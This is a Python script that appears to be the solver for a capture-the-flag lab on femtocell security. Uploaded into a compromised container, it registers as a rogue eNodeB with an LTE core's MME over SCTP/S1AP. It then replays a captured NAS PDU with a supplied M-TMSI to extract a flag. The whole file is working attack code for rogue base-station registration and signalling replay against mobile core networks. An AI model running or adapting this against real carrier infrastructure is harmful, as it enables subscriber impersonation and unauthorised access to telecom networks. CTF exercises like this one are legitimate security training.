#!/usr/bin/env python3
"""Minimal SCTP/S1AP TAU replayer for the isolated femtocell CTF.

The outer solver uploads this file into the compromised ``femto`` container.
It intentionally treats the NAS PDU as opaque: this is an association replay,
not a NAS implementation and it contains no subscriber credentials.
"""

from __future__ import annotations

import argparse
import configparser
import re
import socket
import time
from pathlib import Path

from pycrate_asn1dir import S1AP


SCTP_PROTOCOL = 132
SCTP_DEFAULT_SEND_PARAM = 10
FLAG_RE = re.compile(rb"ctfcup\{[^}\r\n]{1,200}\}")


def plmn_to_s1ap(plmn: str) -> bytes:
    if not plmn.isdigit() or len(plmn) not in (5, 6):
        raise ValueError("PLMN must contain five or six decimal digits")
    digits = f"{plmn}f" if len(plmn) == 5 else plmn
    return bytes.fromhex(digits[1] + digits[0] + digits[5] + digits[2] + digits[4] + digits[3])


def load_core_config(path: Path) -> tuple[str, int, bytes, bytes, int]:
    parser = configparser.ConfigParser()
    if not parser.read(path) or not parser.has_section("s1"):
        raise ValueError(f"missing [s1] configuration in {path}")
    section = parser["s1"]
    peer = section["peer"]
    port = int(section.get("port", "36412"), 0)
    plmn = plmn_to_s1ap(section["plmn"])
    tac = int(section["tac"], 0).to_bytes(2, "big")
    mme_code = int(section["mme_code"], 0)
    if not 0 <= mme_code <= 0xFF:
        raise ValueError("mme_code must fit in one byte")
    return peer, port, plmn, tac, mme_code


def local_core_address(host: str, port: int) -> str:
    """Ask Linux which femto address routes to the private MME network."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((host, port))
        return str(probe.getsockname()[0])
    finally:
        probe.close()


def configure_sctp(client: socket.socket) -> None:
    params = bytearray(client.getsockopt(SCTP_PROTOCOL, SCTP_DEFAULT_SEND_PARAM, 32))
    # S1AP's SCTP payload protocol identifier is 18.
    params[11] = 18
    client.setsockopt(SCTP_PROTOCOL, SCTP_DEFAULT_SEND_PARAM, params)


def set_stream(client: socket.socket, stream: int) -> None:
    params = bytearray(client.getsockopt(SCTP_PROTOCOL, SCTP_DEFAULT_SEND_PARAM, 32))
    params[0] = stream
    client.setsockopt(SCTP_PROTOCOL, SCTP_DEFAULT_SEND_PARAM, params)


def encode_s1_setup(plmn: bytes, tac: bytes) -> bytes:
    ies = [
        {
            "id": 59,
            "value": ("Global-ENB-ID", {"pLMNidentity": plmn, "eNB-ID": ("macroENB-ID", (1203, 20))}),
            "criticality": "reject",
        },
        {"id": 60, "value": ("ENBname", "field-maintenance-aux"), "criticality": "ignore"},
        {
            "id": 64,
            "value": ("SupportedTAs", [{"tAC": tac, "broadcastPLMNs": [plmn]}]),
            "criticality": "reject",
        },
        {"id": 137, "value": ("PagingDRX", "v128"), "criticality": "ignore"},
    ]
    pdu = S1AP.S1AP_PDU_Descriptions.S1AP_PDU
    pdu.set_val(
        (
            "initiatingMessage",
            {"procedureCode": 17, "value": ("S1SetupRequest", {"protocolIEs": ies}), "criticality": "ignore"},
        )
    )
    return pdu.to_aper()


def encode_initial_ue(nas_pdu: bytes, m_tmsi: int, mme_code: int, plmn: bytes, tac: bytes) -> bytes:
    s_tmsi = bytes([mme_code]) + m_tmsi.to_bytes(4, "big")
    ies = [
        {"id": 8, "value": ("ENB-UE-S1AP-ID", 4242), "criticality": "reject"},
        {"id": 26, "value": ("NAS-PDU", nas_pdu), "criticality": "reject"},
        {"id": 67, "value": ("TAI", {"pLMNidentity": plmn, "tAC": tac}), "criticality": "reject"},
        {"id": 100, "value": ("EUTRAN-CGI", {"cell-ID": (1200003, 28), "pLMNidentity": plmn}), "criticality": "ignore"},
        {"id": 134, "value": ("RRC-Establishment-Cause", "mo-Signalling"), "criticality": "ignore"},
        {"id": 96, "value": ("S-TMSI", {"mMEC": s_tmsi[:1], "m-TMSI": s_tmsi[1:]}), "criticality": "reject"},
    ]
    pdu = S1AP.S1AP_PDU_Descriptions.S1AP_PDU
    pdu.set_val(
        (
            "initiatingMessage",
            {"procedureCode": 12, "value": ("InitialUEMessage", {"protocolIEs": ies}), "criticality": "ignore"},
        )
    )
    return pdu.to_aper()


def is_s1_setup_response(payload: bytes) -> bool:
    pdu = S1AP.S1AP_PDU_Descriptions.S1AP_PDU
    pdu.from_aper(payload)
    kind, value = pdu()
    return kind == "successfulOutcome" and value["value"][0] == "S1SetupResponse"


def receive_until(client: socket.socket, predicate: object, timeout: float) -> bytes:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        client.settimeout(max(0.1, deadline - time.monotonic()))
        payload = client.recv(8192)
        if predicate(payload):
            return payload
    raise TimeoutError("timed out waiting for MME response")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--config", default="/etc/femto/connections.ini")
    parser.add_argument("--m-tmsi", required=True)
    parser.add_argument("--nas-pdu-hex", required=True)
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()

    host, port, plmn, tac, mme_code = load_core_config(Path(args.config))
    m_tmsi = int(args.m_tmsi, 0)
    if not 0 <= m_tmsi <= 0xFFFFFFFF:
        raise ValueError("M-TMSI is outside the 32-bit range")
    nas_pdu = bytes.fromhex(args.nas_pdu_hex)
    if len(nas_pdu) < 8:
        raise ValueError("NAS PDU is unexpectedly short")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_SCTP)
    try:
        client.bind((local_core_address(host, port), 0))
        configure_sctp(client)
        client.connect((host, port))
        set_stream(client, 0)
        client.sendall(encode_s1_setup(plmn, tac))
        receive_until(client, is_s1_setup_response, args.timeout)
        set_stream(client, 1)
        client.sendall(encode_initial_ue(nas_pdu, m_tmsi, mme_code, plmn, tac))
        marker = receive_until(client, lambda payload: FLAG_RE.search(payload) is not None, args.timeout)
    finally:
        client.close()

    flag = FLAG_RE.search(marker)
    if flag is None:
        raise RuntimeError("MME response did not contain the lab marker")
    print(flag.group(0).decode("utf-8"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
